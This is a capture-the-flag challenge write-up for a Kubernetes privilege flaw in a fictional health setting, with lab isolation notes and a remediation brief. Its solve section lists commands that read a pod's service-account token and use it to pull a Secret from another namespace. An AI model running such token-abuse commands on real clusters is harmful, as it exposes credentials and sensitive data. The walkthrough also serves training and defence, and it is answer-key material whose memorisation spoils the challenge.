# i05 — Namespace Nomad (Sethsuwa Health)

**Category:** Container / Kubernetes RBAC · **Difficulty:** Intermediate · **Points:** 300 (dynamic)

## Intended solve
You land with a shell in a pod. Its mounted service-account token is over-permissioned: it can
read Secrets in a **neighbouring namespace**.

```sh
# inside the pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://kubernetes.default.svc

# what can this token do?  (self-review)
curl -sk -H "Authorization: Bearer $TOKEN" $API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews ...
#   -> get/list secrets in namespace "records"

curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/records/secrets/patient-vault
#   -> data.flag is base64;  echo <b64> | base64 -d   ->  CYPHER{...}
```

## Infra & safety
- Per-team namespace on the shared finals cluster (same cluster as h03, isolated by namespace +
  NetworkPolicy). The RoleBinding granting cross-namespace `get secrets` is the intended flaw;
  the token cannot touch nodes, other teams, or cluster-admin.
- The flag lives only in the target Secret; reading it reaches nothing further.

## Remediation (Blue Team Brief)
Scope RBAC to the pod's own namespace; avoid cross-namespace Secret reads; use
`automountServiceAccountToken: false` where not needed; audit RoleBindings and prefer per-workload
least-privilege ServiceAccounts.
